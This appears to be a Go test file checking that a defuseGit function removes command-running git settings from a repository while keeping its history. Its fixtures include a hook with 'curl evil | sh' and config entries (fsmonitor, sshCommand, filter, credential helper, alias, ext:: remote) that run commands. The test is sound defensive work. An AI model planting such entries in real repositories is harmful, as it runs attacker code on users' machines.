package sessions

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func write(t *testing.T, path, body string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o755); err != nil {
		t.Fatal(err)
	}
}

func TestDefuseGitKeepsHistoryAndDropsWhatRuns(t *testing.T) {
	dest := t.TempDir()
	g := filepath.Join(dest, ".git")
	write(t, filepath.Join(g, "HEAD"), "ref: refs/heads/main\n")
	write(t, filepath.Join(g, "hooks", "post-checkout"), "#!/bin/sh\ncurl evil | sh\n")
	write(t, filepath.Join(g, "config"), `[core]
	repositoryformatversion = 0
	fsmonitor = /tmp/pwn
	hooksPath = /tmp/hooks
	sshCommand = sh -c pwn
	bare = false
[include]
	path = /tmp/more
[includeIf "gitdir:/"]
	path = /tmp/more
[filter "lfs"]
	clean = sh -c pwn
[diff "x"]
	textconv = pwn
[remote "origin"]
	url = https://github.com/tiny-systems/seedling
	fetch = +refs/heads/*:refs/remotes/origin/*
	uploadpack = sh -c pwn
[remote "evil"]
	url = ext::sh -c pwn
[branch "main"]
	remote = origin
	merge = refs/heads/main
[credential]
	helper = !pwn
[alias]
	st = !pwn
`)
	write(t, filepath.Join(g, "modules", "lib", "hooks", "pre-commit"), "pwn")
	write(t, filepath.Join(g, "modules", "lib", "config"), "[core]\n\tfsmonitor = pwn\n")
	write(t, filepath.Join(g, "config.worktree"), "[core]\n\tfsmonitor = pwn\n")
	write(t, filepath.Join(g, "commondir"), "/Users/someone/other/.git\n")

	if err := defuseGit(dest); err != nil {
		t.Fatal(err)
	}
	cfg, _ := os.ReadFile(filepath.Join(g, "config"))
	got := string(cfg)
	for _, bad := range []string{"fsmonitor", "hookspath", "sshcommand", "include", "filter", "textconv", "uploadpack", "ext::", "credential", "alias", "pwn"} {
		if strings.Contains(strings.ToLower(got), bad) {
			t.Errorf("config still has %q:\n%s", bad, got)
		}
	}
	for _, good := range []string{"repositoryformatversion = 0", "url = https://github.com/tiny-systems/seedling", "merge = refs/heads/main", "[remote \"origin\"]"} {
		if !strings.Contains(got, good) {
			t.Errorf("config lost %q:\n%s", good, got)
		}
	}
	for _, gone := range []string{"hooks/post-checkout", "modules/lib/hooks/pre-commit", "config.worktree", "commondir"} {
		if _, err := os.Stat(filepath.Join(g, gone)); !os.IsNotExist(err) {
			t.Errorf("%s survived", gone)
		}
	}
	sub, _ := os.ReadFile(filepath.Join(g, "modules", "lib", "config"))
	if strings.Contains(string(sub), "fsmonitor") {
		t.Errorf("submodule config kept fsmonitor: %s", sub)
	}
	if _, err := os.Stat(filepath.Join(g, "HEAD")); err != nil {
		t.Error("HEAD was removed")
	}
}

func TestDefuseGitRemovesAGitFile(t *testing.T) {
	dest := t.TempDir()
	write(t, filepath.Join(dest, ".git"), "gitdir: /Users/someone/project/.git\n")
	if err := defuseGit(dest); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Lstat(filepath.Join(dest, ".git")); !os.IsNotExist(err) {
		t.Error(".git file survived")
	}
}
